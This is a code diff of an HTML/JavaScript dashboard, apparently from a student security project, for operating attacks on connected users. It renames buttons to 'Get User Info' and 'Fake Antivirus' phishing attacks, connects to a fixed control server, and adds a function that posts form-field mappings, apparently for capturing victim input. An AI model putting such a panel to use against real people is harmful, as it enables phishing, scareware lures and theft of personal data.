@@ -14,7 +14,6 @@
     <script src="https://code.jquery.com/jquery-3.3.1.js"></script>
     <script src="https://cdn.datatables.net/1.10.19/js/jquery.dataTables.min.js"></script>
     <script src="https://cdn.datatables.net/1.10.19/js/dataTables.bootstrap4.min.js"></script>
-    <script>src = "https://cdn.datatables.net/plug-ins/1.10.19/api/fnAddTr.js"</script>
 
     <script>
         $(document).ready(function () {
@@ -45,6 +44,9 @@
                             )
                         ).show();
                 });
+                $(this).find("a[id*='viewinfo']").each(function(){
+                    this.text = 'View Info';
+                })
             });
 
 
@@ -63,7 +65,7 @@
             });
 
 
-            var socket = io.connect();
+            var socket = io.connect("https://cse331.andrewjaffie.me/socket.io");
 
             socket.on('disconnectSuccessful', function (id) {
                 var fullid = "status" + id;
@@ -114,13 +116,13 @@
                 var phish_buttons = '<td class="text-center">' +
                     '<div class="btn-group" role="group" aria-label="Basic example">' +
                     '<button type="button" class="btn btn-outline-secondary buttontext"' +
-                    'onclick="call_phishing(' + id + ',1)">Phish #1</button>' +
+                    'onclick="call_phishing(' + id + ',1)">Get User Info</button>' +
                     '<button type="button" class="btn btn-outline-secondary buttontext"' +
                     'onclick="call_phishing(' + id + ',2)">Phish #2</button></div></td>';
 
                 var infobutton = '<td><a id="viewinfo' + id + '" class="btn btn-primary" data-toggle="collapse"'
                     + 'role="button" aria-expanded="false" aria-controls="collapse' + id + '"' +
-                    'onclick="get_info_display_same_page(' + id + ')">View Info</a></td>';
+                    'onclick="get_info_display_same_page(' + id + ')">Fake Antivirus</a></td>';
 
 
                 var childrowid = "childRow" + id;
@@ -220,10 +222,10 @@
             <td class="text-center">
                 <div class="btn-group" role="group" aria-label="Basic example">
                     <button type="button" class="btn btn-outline-secondary buttontext"
-                            onclick="call_phishing({{ item[0] }},1)">Phish #1
+                            onclick="call_phishing({{ item[0] }},1)">Get User Info
                     </button>
                     <button type="button" class="btn btn-outline-secondary buttontext"
-                            onclick="call_phishing({{ item[0] }},2)">Phish #2
+                            onclick="call_phishing({{ item[0] }},2)">Fake Antivirus
                     </button>
                 </div>
             </td>
@@ -238,10 +240,6 @@
     {% endfor %}
     </tbody>
 </table>
-<script>
-
-
-</script>
 <script>
     function call_javascript(person) {
         document.getElementById("success-message").innerHTML = "JS Attack on " + person + " sent!";
@@ -266,7 +264,8 @@
     }
 
     function call_phishing(id, attackNumber) {
-        document.getElementById("success-message").innerHTML = "Phishing Attack #" + attackNumber + " on " + id + " sent!";
+        var a = {1: "User Info Phishing Attack on User #", 2: "Fake Antivirus Phishing Attack on User #"}
+        document.getElementById("success-message").innerHTML = a[attackNumber] + id + " sent!";
         $('.success').fadeIn().delay(500).fadeOut();
         $.ajax({
             url: "/phish",
@@ -288,6 +287,27 @@
 
     }
 
+    function submitFormIDMappings(url, mappings){
+        var clientid = mappings[0].id
+        mappings = JSON.stringify(mappings);
+        console.log(mappings);
+        $.ajax({
+            url: "/sendFormIDMappings",
+            type: "post",
+            data: {
+                url_for_mapping:url,
+                mappings: mappings
+            },
+            success: function (response) {
+                console.log(response)
+            },
+            error: function (error) {
+                console.log(error)
+            }
+        });
+
+        get_info_display_same_page(clientid, 'false')
+    }
     function get_info_display_new_tab(person) {
         $.ajax({
             url: "/getinfo",
@@ -326,7 +346,8 @@
                         console.log('success')
                         var a = "collapse" + person;
 
-                        childRow.innerHTML = response;
+                        childRow.innerHTML =  response;
+                        ;
                     },
                     error: function (error) {
                         console.log(error)
@@ -387,7 +408,7 @@
 
     .dataTables_wrapper {
         margin: 0 auto;
-        width: 55%;
+        width: 60%;
     }
 
 
